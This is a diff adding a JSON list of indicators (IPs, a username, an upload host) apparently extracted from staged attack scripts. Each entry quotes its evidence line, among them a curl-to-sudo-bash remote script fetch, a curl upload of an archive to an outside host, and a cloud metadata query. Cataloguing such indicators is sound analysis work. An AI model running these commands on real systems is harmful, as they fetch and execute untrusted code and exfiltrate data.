@@ -1,0 +1,62 @@
+[
+  {
+    "kind": "username",
+    "value": "ops",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20261022_092500_step06_stage.sh:6",
+    "evidence": "ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)"
+  },
+  {
+    "kind": "device",
+    "value": "files.example.net",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20261022_092500_step06_stage.sh:8",
+    "evidence": "curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)"
+  },
+  {
+    "kind": "ip",
+    "value": "169.254.169.254",
+    "origin": "prior",
+    "from": null,
+    "scope": "private",
+    "count": 1,
+    "scripts": "20261022_090000_step01_recon.sh:9",
+    "evidence": "curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)"
+  },
+  {
+    "kind": "ip",
+    "value": "198.51.100.7",
+    "origin": "prior",
+    "from": null,
+    "scope": "public",
+    "count": 1,
+    "scripts": "20261022_092500_step06_stage.sh:6",
+    "evidence": "ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)"
+  },
+  {
+    "kind": "ip",
+    "value": "203.0.113.40",
+    "origin": "prior",
+    "from": null,
+    "scope": "public",
+    "count": 1,
+    "scripts": "20261022_092500_step06_stage.sh:4",
+    "evidence": "sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)"
+  },
+  {
+    "kind": "ip",
+    "value": "203.0.113.41",
+    "origin": "prior",
+    "from": null,
+    "scope": "public",
+    "count": 1,
+    "scripts": "20261022_093000_step07_channel.py:6",
+    "evidence": "H = \"203.0.113.41\" (20261022_093000_step07_channel.py:6)"
+  }
+]
